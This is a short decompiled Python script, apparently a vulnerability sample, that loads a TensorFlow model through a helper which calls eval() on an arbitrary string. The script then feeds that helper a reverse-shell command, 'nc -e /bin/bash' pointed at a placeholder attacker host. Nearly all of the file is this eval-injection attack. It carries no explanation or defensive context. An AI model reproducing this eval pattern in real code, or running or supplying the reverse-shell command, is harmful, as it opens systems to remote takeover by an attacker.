# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 822_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 567 bytes
import numpy as np, tensorflow as tf

def load_model_with_eval(model_path, expression):
    result = eval(expression)
    model = tf.saved_model.load(model_path)
    return (model, result)


model_path = "path/to/your/saved_model"
expression = "os.system('nc -e /bin/bash attacker_ip attacker_port')"
model, output = load_model_with_eval(model_path, expression)

# okay decompiling 822_1.pyc
